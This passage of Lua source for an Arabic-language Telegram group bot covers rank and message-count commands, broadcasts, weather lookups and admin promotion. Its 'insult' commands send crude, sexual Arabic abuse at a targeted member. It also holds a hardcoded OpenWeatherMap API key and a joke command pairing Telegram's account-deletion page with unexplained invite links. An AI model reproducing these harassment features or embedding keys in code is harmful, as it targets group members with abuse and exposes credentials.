if (text:match("^موقعي$") or text:match("^رتبتي$")) and bot11(msg) then
function get_me(extra,result,success)
local boty = (botx1:get('bot:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local bot = botx1:get(BOT..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local msguser = tonumber(botx1:get(BOT..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = botx1:get(BOT..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(botx1:get(BOT..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(botx1:get(BOT..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local text = (tonumber(botx1:get(BOT.."text:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local sticker = (tonumber(botx1:get(BOT.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Photo = (tonumber(botx1:get(BOT.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Voice = (tonumber(botx1:get(BOT.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Gif = (tonumber(botx1:get(BOT.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Video = (tonumber(botx1:get(BOT.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
if is_leaderid(result.id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_sudoid(result.id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'sudo 2'
else
t = 'مطور ثانويه'
end
elseif is_admin(result.id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(result.id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(result.id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(result.id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(result.id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(result.id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(result.id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(result.id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_vipmem(result.id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
function formsgg(msgs) 
local bot = ''  
if msgs < 100 then 
bot = 'كلش ضعيف 😫' 
elseif msgs < 250 then 
bot = 'ضعيف 😨' 
elseif msgs < 500 then 
bot = 'غير متفاعل 😒' 
elseif msgs < 750 then 
bot = 'متوسط 😎' 
elseif msgs < 1000 then 
bot = 'متفاعل 😘' 
elseif msgs < 2000 then 
bot = 'قمة التفاعل 😍' 
elseif msgs < 3000 then 
bot = 'ملك التفاعل 😻'  
elseif msgs < 4000 then 
bot = 'اسطورة التفاعل 🍃' 
elseif msgs < 5000 then 
bot = 'متفاعل نار كلش 🔥' 
elseif msgs < 5500 then 
bot = 'نار وشرار' 
elseif msgs < 6000 then 
bot = 'خيالي' 
elseif msgs < 7000 then 
bot = 'كافر بالتفاعل' 
elseif msgs < 8000 then 
bot = 'رب التفاعل ' 
end 
return bot
end
if result.username_ then
username = '@'..result.username_
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
username = 'Not Found'
else
username = 'لا يوجد'
end
end
if result.last_name_ then
lastname = result.last_name_
else
lastname = ''
end
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Your name • '..result.first_name_..' '..lastname..' •\n🎖⁞ Your user • '..username..' •\n🚦⁞ Your ID • '..result.id_..' •\n📚⁞ Your Rank • '..t, 1, 'html')
else
botdx(msg.chat_id_, msg.id_, 1, '👋╿❯ اهلا بك { '..result.first_name_..' }\n\n👤┊❯ معرفك  { '..username..' }\n🌿┊❯ ايديك  { '..result.id_..' }\n🐾╽❯ نقاطك { '..user_nkt..' }\n\n📃 • ❯ { احصائيات الرسائل }\n📬╿❯ الرسائل { '..(user_msgs + boty)..' / '..(bot)..'} \n💸┊❯ الملصقات { '..sticker..' }\n📸┊❯ الصور  { '..Photo..' }\n🔊┊❯ الصوت { '..Voice..' }\n⏳┊❯ المتحركه { '..Gif..' }\n🎞┊❯ الفيديو{ '..Video..' }\n🕹╽❯ الجهات  { '..cont..' }\n\n📉╿❯ التفاعل { '..formsgg(msguser)..' } \n\n🎫 • ❯ موقعك  '..t, 1, 'html')
end 
end
getUser(msg.sender_user_id_,get_me)
end
if text:match("^الرتبه$") and msg.reply_to_message_id_ ~= 0 then
function rt_by_reply(extra, result, success) 
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
renk_gps = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
renk_gps = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
renk_gps = 'عضو'
end
if result.id_ then
if tonumber(result.sender_user_id_) == tonumber(SUDO) then
bot1 = "مطور اساسي 🎖"
elseif is_sudoid(result.sender_user_id_) then
bot1 = "مطور ثانوي"
elseif is_admin(result.sender_user_id_, msg.chat_id_) then
bot1 = "مطور رتبه ثالثه 🏁"
elseif is_onall(result.sender_user_id_) then
bot1 = "مدير عام 🚩"
elseif is_moall(result.sender_user_id_) then
bot1 = "ادمن عام 🚩"
elseif is_vpall(result.sender_user_id_) then
bot1 = "مميز عام 🚩"
elseif is_monsh(result.sender_user_id_, msg.chat_id_) then
bot1 = "منشئ 🚩"
elseif is_owner(result.sender_user_id_, msg.chat_id_) then
bot1 = "مدير 🚩"
elseif is_momod(result.sender_user_id_, msg.chat_id_) then
bot1 = "ادمن 🚩"
elseif is_vipmem(result.sender_user_id_, msg.chat_id_) then
bot1 = "عضو مميز 🚩"
elseif is_donky(result.sender_user_id_, msg.chat_id_) then
bot1 = "مطي مرتب 😹💔"
else
bot1 = "عضو فقط 🚩"
end
end
local bot = '*🌿╿❯ اهلا بك عزيزي { '..renk_bot(msg)..' }*\n*🍄┊❯ رتبه المستخدم* { '..bot_res..' }\n*💥┊❯ في البوت { '..bot1..' }*\n*✨┊❯ في الكروب { '..renk_gps..' }*\n'
botdx(msg.chat_id_, msg.id_, 1,bot, 1, 'md') 
end,nil)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,rt_by_reply)
end
-----------------------bot
if is_sudo(msg) then
if text == 'توجيه للكل' and tonumber(msg.reply_to_message_id_) > 0 then
function bot(extra,result,success)
local list = botx1:smembers(BOT.."bot:groups")
for k,v in pairs(list) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end
end
local gps = botx1:scard(BOT..'bot:groups') or 0
botdx(msg.chat_id_, msg.id_, 1, '🎖 ⁞ تم نشر رسالتك بالتوجيه ✔️\n🎖 ⁞ في : { '..gps..' } مجموعه 💠 ', 1, 'md')
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bot)
end
if text:match("^اذاعه (.*)$") and is_sudo(msg) then  
local gps = botx1:scard(BOT.."bot:groups") or 0
local gpss = botx1:smembers(BOT.."bot:groups") or 0
local rwss = {string.match(text, "^(اذاعه) (.*)$")}
local bib = rwss[2]
for i=1, #gpss do
botdx(gpss[i], 0, 1, bib, 1, 'md')
end
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Your Message send to :{ '..gps..' } groups •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🎈|| تم نشر رسالتك ✔️\n🔘|| في : { '..gps..' } مجموعه 💠 ', 1, 'md')
end
end
end
if text:match("^(time)$") or text:match("^(الوقت)$")  then
botdx(msg.chat_id_, msg.id_, 1, '⏰ ⁞ الساعه ~ '..os.date("%I:%M%p")..' •\n📆 ⁞ التاريخ ~  '..os.date("%Y/%m/%d")..' •\n', 1, 'md')
end
if text:match("^زخرفه$")  then  
botx1:setex(BOT.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
botx1:setex(BOT.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ارسل الكلمه لزخرفتها •\n🚦⁞ يمكن الزخرفه باللغتين {ar , en}', 1, 'md')
end
--------------------
if text:match("^مشاهده المنشور$") then
botx1:set(BOT..'bot:viewget'..msg.sender_user_id_,true)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '> Plese forward your post : ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ارسل لي المنشور الان •', 1, 'md')
end
end
----- bot
if text:match("^اطردني$") then
if not botx1:get(BOT.."lock_kickme"..msg.chat_id_) then
botx1:set(BOT..'yes'..msg.sender_user_id_..'', 'kickyes')
botx1:set(BOT..'no'..msg.sender_user_id_..'', 'kickno')
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ارسل *{ نعم }* ليتم طردك•\n📚⁞ ارسل *{ لا } *ليتم الغاء طردك •", 1, "md")
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ هذه الخاصيه معطله •', 1, 'md')
end
end
local kickme = botx1:get(BOT..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
if text:match("^نعم$") then
if is_vipmem(msg.sender_user_id_, msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ لا استطيع طرد المشرفين •", 1, "md")
else
local kickme = botx1:get(BOT..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
chat_kick(msg.chat_id_, msg.sender_user_id_)
botx1:del(BOT..'yes'..msg.sender_user_id_..'', 'kickyes')
botx1:del(BOT..'no'..msg.sender_user_id_..'', 'kickno')
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم طردك لا ترجع بعد •", 1, "md")
end
end
end
if text:match("^لا$") then
local notkickme = botx1:get(BOT..'no'..msg.sender_user_id_..'')
if notkickme == 'kickno' then
botx1:del(BOT..'yes'..msg.sender_user_id_..'', 'kickyes')
botx1:del(BOT..'no'..msg.sender_user_id_..'', 'kickno')
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم الغاء طردك لا تشاقه هيج شقه •", 1, "md")
end
end
end   
if text == 'تعطيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not botx1:get(BOT.."lock_kickme"..msg.chat_id_) then
botx1:set(BOT.."lock_kickme"..msg.chat_id_, true)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل امر اطردني •', 1, 'md')
end
end
if text == 'تفعيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT.."lock_kickme"..msg.chat_id_) then
botx1:del(BOT.."lock_kickme"..msg.chat_id_)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل امر اطردني •', 1, 'md')
end
end
if text:match("^source$") or text:match("^اصدار$") or text:match("^الاصدار$") or  text:match("^السورس$") or text:match("^سورس$") then 
local text =  [[
🚦⁞ مرحبا بك في التحديث الجديد •

📠⁞  طريقه التنصيب في الاسفل •

[🗳⁞ مطور السورس •](t.me/pro_c9)
[🗳⁞ تواصل المحظورين •](t.me/ramixnxx_bot)

[🗳⁞ قناة السورس •](t.me/rambo_syr1)
]]
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--------bot
if text:match("^[Gg][Rr][Oo][Uu][Pp][Ss]$") and is_admin(msg.sender_user_id_, msg.chat_id_) or text:match("^الكروبات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
local bot = botx1:scard(BOT.."bot:groups")
local dx = botx1:scard("bot:addg"..bot_id) or 0
local users = botx1:scard(BOT.."bot:userss")
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ *Groups :*  '..gps..'', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '*📌⁞ اعضاء الخاص { '..users..' }\n🚦⁞ عدد كروبات { '..bot..' }\n🎖⁞ الكروبات المفعله { '..dx..' }\n⚜⁞ الغير مفعله {'..(bot - dx)..'} *', 1, 'md')
end
end  
if  text:match("^[Mm]sg$") or text:match("^رسائلي$") and msg.reply_to_message_id_ == 0  then
local user_msgs = botx1:get(BOT..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local bot = botx1:get(BOT..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local boty = (botx1:get('bot:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ welcome my dear •\n📬⁞ you have {*"..(user_msgs + boty).." }* msg •\n📖⁞ in group •", 1, 'md')
else 
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ اهلا وسهلا عزيزي •\n📬⁞ رسائلك الحقيقيه {*"..user_msgs.." }* •\n📬⁞ رسائلك المضافه {*"..boty.." }* •\n📬⁞ رسائلك اليوم *{"..(bot).."} •*\n📬⁞ مجموع رسائلك {*"..(user_msgs + boty).." }* \n📖⁞ في المجموعه •", 1, 'md')
end
end
if text:match("^[Gg]p id$") or text:match("^ايدي المجموعه$") then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = "🚦⁞ Group ID ~ "..msg.chat_id_
else
texts = "🚦⁞ ايدي المجموعه ~ "..msg.chat_id_
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
-------------------------------------bot----------------------------------------------------------
if text:match("^ايديي$") then 
botdx(msg.chat_id_, msg.id_, 1,'`'..msg.sender_user_id_..'`', 1, 'md') 
end
----------bot
if text:match("^[Mm]y username$") or text:match("^معرفي$")  then
function get_username(extra,result,success)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '🚦⁞ Your Username ~ {User}'
else
text = '🚦⁞ معرفك ~ {User}'
end
local text = text:gsub('{User}',('@'..result.username_ or ''))
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
-------------------------------------faedee----------------------------------------------------------
if text:match("^[Mm]y name$") or text:match("^اسمي$") then
function get_firstname(extra,result,success)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '🚦⁞ your name ~ {firstname}'
else
text = '🚦⁞ اسمك ~ {firstname}'
end
local text = text:gsub('{firstname}',(result.first_name_ or ''))
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
-------bot
if text:match('^الحساب (%d+)$') then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده العضو 🎈'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
--------------bot
if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") then
 
local text =  [[
🚦⁞ رابط حذف التلي •
🎖⁞ براحتك هو انت تطرب ع الحذف •
📖⁞ [• اضغط هنا لحذف الحساب •](https://telegram.org/deactivate) •
🎁⁞ [• اضغط هنا لديك مفاجئه •](https://t.me/joinchat/AAAAAEyMJ12Ep2akX37-aA) •
🎁⁞ [• اضغط هنا لديك مفاجئه اخرى •](https://t.me/joinchat/AAAAAEDJCeBNNDdScN-_sg) •
]]
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if text:match("^جهاتي$") then
add = (tonumber(botx1:get(BOT..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ عدد الجهات الي ضفتها • *{"..add.."}*", 1, 'md')
end
if text:match("^رسائلي اليوم$") then 
local bot = botx1:get(BOT..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
botdx(msg.chat_id_, msg.id_, 1, "📬⁞ رسائلك اليوم *{"..(bot).."} •*", 1, 'md')
end
------------------bot
if text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$") or text:match("^(طقس) (.*)$") then 
MatchesEN = {text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$")}; MatchesFA = {text:match("^(طقس) (.*)$")}
Ptrn = MatchesEN[2] or MatchesFA[2]
local function temps(K)
local F = (K*1.8)-459.67
local C = K-273.15
return F,C 
end	
local res = http.request("http://api.openweathermap.org/data/2.5/weather?q="..URL.escape(Ptrn).."&appid=269ed82391822cc692c9afd59f4aabba")
local jtab = json:decode(res)
if jtab.name then
if jtab.weather[1].main == "Thunderanwar" then
status = "⛈ عاصف"
elseif jtab.weather[1].main == "Drizzle" then
status = "🌦 امطار خفيفه"
elseif jtab.weather[1].main == "Rain" then
status = "🌧 مطر شديد"
elseif jtab.weather[1].main == "Snow" then
status = "🌨 مثلج"
elseif jtab.weather[1].main == "Atmosphere" then
status = "🌫 مغبر"
elseif jtab.weather[1].main == "Clear" then
status = "🌤️ صاف"
elseif jtab.weather[1].main == "Clouds" then
status = "☁️ غائم"
elseif jtab.weather[1].main == "Extreme" then
status = "-------"
elseif jtab.weather[1].main == "Additional" then
status = "-------"
else
status = "-------"
end
local F1,C1 = temps(jtab.main.temp)
local F2,C2 = temps(jtab.main.temp_min)
local F3,C3 = temps(jtab.main.temp_max)
if jtab.rain then
rain = jtab.rain["3h"].." ميليمتر"
else
rain = "-----"
end
if jtab.snow then
snow = jtab.snow["3h"].." ميليمتر"
else
snow = "-----"
end
today = "• اسم المدينه : *"..jtab.name.."*\n"
.."• اسم الدوله : *"..(jtab.sys.country or "----").."*\n"
.."• درجه الحراره :\n"
.."   "..C1.."° سلليزي\n"
.."   "..F1.."° فهرنهايت\n"
.."   "..jtab.main.temp.."° كلفن\n"
.."• الجو "..status.." تقريبا\n\n"
.."• درجه حراره اليوم الصغرى : C"..C2.."°   F"..F2.."°   K"..jtab.main.temp_min.."°\n"
.."• درجه حراره اليوم الكبرى : C"..C3.."°   F"..F3.."°   K"..jtab.main.temp_max.."°\n"
.."• رطوبة الهواء : "..jtab.main.humidity.."%\n"
.."• كثافه الغيوم : "..jtab.clouds.all.."%\n"
.."• سرعه الرياح : "..(jtab.wind.speed or "------").." متر / ثانيه\n"
.."• اتجاه الرياح : "..(jtab.wind.deg or "------").."° درجه\n"
.."• تقلب الرياح : "..(jtab.main.pressure/1000).."\n"
.."• اخر 3 ساعات من المطر : "..rain.."\n"
.."• اخر 3 ساعات من تساقط الثلوج : "..snow.."\n\n"
after = ""
local res = http.request("http://api.openweathermap.org/data/2.5/forecast?q="..URL.escape(Ptrn).."&appid=269ed82391822cc692c9afd59f4aabba")
local jtab = json:decode(res)
for i=1,5 do
local F1,C1 = temps(jtab.list[i].main.temp_min)
local F2,C2 = temps(jtab.list[i].main.temp_max)
if jtab.list[i].weather[1].main == "Thunderanwar" then
status = "⛈ عاصف"
elseif jtab.list[i].weather[1].main == "Drizzle" then
status = "🌦 امطار خفيفه"
elseif jtab.list[i].weather[1].main == "Rain" then
status = "🌧 مطر شديد"
elseif jtab.list[i].weather[1].main == "Snow" then
status = "🌨 مثلج"
elseif jtab.list[i].weather[1].main == "Atmosphere" then
status = "🌫 مغبر"
elseif jtab.list[i].weather[1].main == "Clear" then
status = "🌤️صاف"
elseif jtab.list[i].weather[1].main == "Clouds" then
status = "☁️ غائم"
elseif jtab.list[i].weather[1].main == "Extreme" then
status = "-------"
elseif jtab.list[i].weather[1].main == "Additional" then
status = "-------"
else
status = "-------"
end
if i == 1 then
day = "• طقس يوم غد"
elseif i == 2 then
day = "• طقس بعد غد"
elseif i == 3 then
day = "• طقس بعد 3 ايام"
elseif i == 4 then
day = "• طقس بعد 4 ايام"
elseif i == 5 then
day = "• طقس بعد 5 ايام"
end
after = after.."- "..day..status.." تقريبا \n🔺C"..C2.."°  *-*  F"..F2.."°\n🔻C"..C1.."°  *-*  F"..F1.."°\n"
end
Text = today.."• حاله الطقس ل5 ايام القادمه 🔽:\n"..after
botdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
else
Text  = "• لا توجد مدينه بهذا الاسم 🌐"
botdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
end
end
---------------bot
if (msg.sender_user_id_) then
local text = msg.content_.text_:gsub("[Pp]rice", "Nerkh")
if text:match("^[Nn]erkh$") or text:match("^المطور$") then
local nerkh = botx1:get(BOT.."nerkh")
if nerkh then
botdx(msg.chat_id_, msg.id_, 1, nerkh, 1, "md")
elseif botx1:get(BOT.."lang:gp:" .. msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ Bot not found •", 1, "md")
else
botdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ لم يتم وضع كليشه المطور •", 1, "md")
end
end 
end 
---------------bot
if text and text:match('^هينه @(.*)')  then 
local username = text:match('^هينه @(.*)') 
function bot(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
botdx(msg.chat_id_, msg.id_, 1, 'يول شو تمسلت اكو واحد يهين نفسه ', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(bot_owner) then 
botdx(msg.chat_id_, msg.id_, 1, 'شو انت تمضرط تريد اهين تاج راسي مثلا ?', 1, 'md') 
return false  
end  
local bot = { "لك حيوان @"..username.." 100 نعال اسوكك بس تحجي فهمت ","لك فرخ @"..username.." اكل خره لا رجعك منين ما طلعت  ","حبيبي @"..username.." راح احاول احترمك هالمره بلكي تبطل حيونه ","فرخ دودكي  @"..username.." صير ادمي لا حطك بركبتي ",}
botdx(msg.chat_id_, result.id_, 1,''..bot[math.random(#bot)]..'', 1, 'html') 
else  
botdx(msg.chat_id_, msg.id_, 1, '💥*¦*  العضو لا يوجد في المجموعه ', 1, 'md') 
end 
end 
resolve_username(username,bot)
end
------------------bot
if text:match("^هينه$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
botdx(msg.chat_id_, msg.id_, 1, '• شكد غبي لعد 🌚😂 تريدني اهين نفسي ؟ دكسمك 😌😂', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
botdx(msg.chat_id_, msg.id_, 1, '• دي لك تريد اهين تاج راسك ؟ 🌚', 1, 'md')
return false
end 
local bot = "• صار ستاذي 😌" 
botdx(msg.chat_id_, msg.id_, 1,bot, 1, 'md') 
local bot = {"• ها لك جرجف اليوم اكتلك واخري ع كبرك 😈","• حضينه مستنقع الجبات صير عاقل لا اهفك بالنعال 😒","• قاروره جاروره بلاع العيوره لا تندك باسيادك 😒","• خاب دي لا احط بكسمك الديفدي واركعك بعير ثري دي  فرخي ابن جبتي 😒"} 
botdx(msg.chat_id_, result.id_, 1,''..bot[math.random(#bot)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
botdx(msg.chat_id_, msg.id_, 1, '• حياتي بس فهمني شون ابوس نفسي وتدلل 😔😂', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
botdx(msg.chat_id_, msg.id_, 1, '• اموووووووواح احلا بوسه لمطوري 😻', 1, 'md')
return false
end 
local bot = "• صار ستاذي راح اتماصص وياه 🙊😻" 
botdx(msg.chat_id_, msg.id_, 1,bot, 1, 'md') 
local bot = {"• تعالي حياتي خل نتماصص 😻👏","• اممممووووواااااح لصق الشفه 😻","• امح امح امح امح بوسه لو عسل 😼😻"} 
botdx(msg.chat_id_, result.id_, 1,''..bot[math.random(#bot)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
botdx(msg.chat_id_, msg.id_, 1, '• حياتي بس فهمني شون ابوس نفسي وتدلل 😔😂', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
botdx(msg.chat_id_, msg.id_, 1, '• اموووووووواح احلا بوسه لمطوري 😻', 1, 'md')
return false
end 
local bot = "• صار ستاذي راح اتماصص وياه 🙊😻" 
botdx(msg.chat_id_, msg.id_, 1,bot, 1, 'md') 
local bot = {"• تعالي حياتي خل نتماصص 😻👏","• اممممووووواااااح لصق الشفه 😻","• امح امح امح امح بوسه لو عسل 😼😻"} 
botdx(msg.chat_id_, result.id_, 1,''..bot[math.random(#bot)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^رفع ادمن بالكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « ادمن بالكروب » *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل ادمن بالكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *ادمن الكروب* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله « عضو » *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text:match("^رفع بكل الصلاحيات$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « ادمن بالكروب بكل الصلاحيات »\n👤╿❯ صلاحياته الان •\n☑️┊❯ تغيير اسم المجموعه •\n☑️┊❯ حذف الرسائل •\n☑️┊❯ الدعوه بالرابط •\n☑️┊❯ تثبيت الرسائل •\n☑️╽❯ اضافه مشرفين •*', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه تغيير الاسم$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
